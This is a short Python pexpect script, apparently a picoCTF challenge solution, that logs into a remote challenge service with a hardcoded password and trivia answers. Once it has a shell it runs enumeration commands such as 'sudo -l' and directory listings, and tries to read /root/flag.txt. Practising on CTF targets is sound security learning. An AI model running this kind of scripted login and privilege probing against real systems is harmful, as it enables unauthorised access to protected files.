#!/usr/bin/env python3
import pexpect
import sys
import time

child = pexpect.spawn('nc tethys.picoctf.net 59853', encoding='utf-8', timeout=30)
child.logfile = sys.stdout

# Wait for password prompt
child.expect('password?')
child.sendline('My_Passw@rd_@1234')
time.sleep(1)

# Answer conference question
child.expect('world?')
child.sendline('DEFCON')
time.sleep(1)

# Answer hacker question
child.expect('it?')
child.sendline('John Draper')
time.sleep(1)

# Now we should have a shell
child.expect('player@challenge')

# Execute commands
commands = [
    'id',
    'pwd',
    'sudo -l',
    'ls -la ~',
    'ls -la /',
    'cat /root/flag.txt 2>&1',
]

for cmd in commands:
    child.sendline(cmd)
    time.sleep(1)
    
child.sendline('exit')
child.expect(pexpect.EOF)
